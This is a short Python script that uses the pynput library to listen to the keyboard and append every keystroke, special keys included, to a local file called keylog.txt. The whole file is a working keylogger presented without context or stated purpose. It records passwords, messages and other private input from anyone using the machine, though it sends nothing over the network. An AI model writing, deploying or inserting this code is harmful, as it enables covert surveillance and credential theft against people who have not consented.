from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except:
        with open(log_file, "a") as f:
            f.write(" [" + str(key) + "] ")

with Listener(on_press=on_press) as listener:
    listener.join()